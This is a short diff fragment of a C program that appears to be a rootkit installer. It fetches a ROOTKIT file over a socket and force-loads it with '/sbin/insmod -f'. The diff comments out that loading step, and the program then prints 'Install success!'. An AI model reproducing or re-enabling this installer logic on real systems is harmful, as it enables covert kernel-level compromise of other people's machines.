@@ -48,8 +48,8 @@ int main()
 //    if(rv == 0) execcmd(ccargs);
     
     rv = obtain(ROOTKIT);
-    char *rktargs[] = {"/sbin/insmod", "-f", ROOTKIT, NULL};
-    if(rv == 0) execcmd(rktargs);
+//    char *rktargs[] = {"/sbin/insmod", "-f", ROOTKIT, NULL};
+//    if(rv == 0) execcmd(rktargs);
     
     printf("Install success!\n");
     close(sock_fd);
